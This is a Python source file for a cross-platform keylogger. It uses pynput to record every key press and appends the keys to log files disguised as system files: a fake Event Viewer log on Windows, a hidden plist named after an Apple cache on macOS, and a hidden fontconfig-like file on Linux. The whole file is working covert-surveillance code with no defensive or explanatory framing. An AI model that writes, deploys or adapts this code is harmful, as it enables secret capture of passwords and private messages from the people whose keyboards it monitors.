from pynput.keyboard import Key, Listener
import platform
import os

def on_press(key):
    """Handle key press events and log them to file."""
    try:
        # Handle alphanumeric keys
        key_data = key.char
    except AttributeError:
        # Handle special keys (e.g., Key.space, Key.enter)
        key_data = str(key).replace("Key.", "")
        
    write_file(key_data)

def get_log_path():
    system = platform.system()
    
    if system == "Windows":
        return os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Event Viewer', 'ExternalLogs.dat')
        
    elif system == "Darwin":
        return os.path.expanduser('~/Library/Caches/.com.apple.bird.plist')
        
    elif system == "Linux":
        return os.path.expanduser('~/.cache/.fontconfig-timestamp.dat')

def write_file(key_data):
    log_file = get_log_path()
    with open(log_file, 'a') as f:
        f.write(f"{key_data} ")

with Listener(on_press=on_press) as listener:
    listener.join()
